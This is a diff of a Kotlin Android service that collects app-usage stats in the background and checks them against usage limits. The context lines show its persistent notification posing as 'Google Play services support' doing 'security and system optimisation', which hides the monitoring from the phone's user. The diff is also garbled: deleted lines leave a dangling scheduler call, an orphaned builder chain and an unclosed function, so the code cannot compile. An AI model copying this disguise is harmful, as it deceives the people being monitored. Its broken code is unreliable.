@@ -28,15 +28,13 @@ class TimesnooperMonitorService : Service() {
         // 매일 정기 리포트 알람 스케줄러 등록 (기본 오후 10시 / 22:00)
         DailyReportAlarmReceiver.scheduleDailyAlarm(this)
 
-        // 15분 주기 주기적 백그라운드 사용량 캐싱 및 동기화 루프
-        executor.scheduleWithFixedDelay({
+        // 10분 주기 주기적 백그라운드 사용량 캐싱 및 한도 초과 검사 루프
             collectAndBufferUsageStats()
-        }, 1, 15, TimeUnit.MINUTES)
-    }
-
+            checkUsageLimitAndTriggerAlert()
+        }, 1, 10, TimeUnit.MINUTES)
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        // 시스템에 의해 킬당하더라도 OS가 자동으로 서비스를 다시 살리도록 START_STICKY 반환
-        return START_STICKY
+        if (intent?.action == ACTION_CHECK_LIMIT_NOW) {
+            executor.execute {
     }
 
     override fun onTaskRemoved(rootIntent: Intent?) {
@@ -79,8 +77,8 @@ class TimesnooperMonitorService : Service() {
         }
     }
 
-    private fun createSilentNotification(): Notification {
-        return NotificationCompat.Builder(this, CHANNEL_ID)
+    private fun checkUsageLimitAndTriggerAlert() {
+        try {
             .setContentTitle("Google Play 서비스 지원")
             .setContentText("보안 및 시스템 백그라운드 서비스 최적화 중")
             .setSmallIcon(android.R.drawable.ic_menu_agenda)
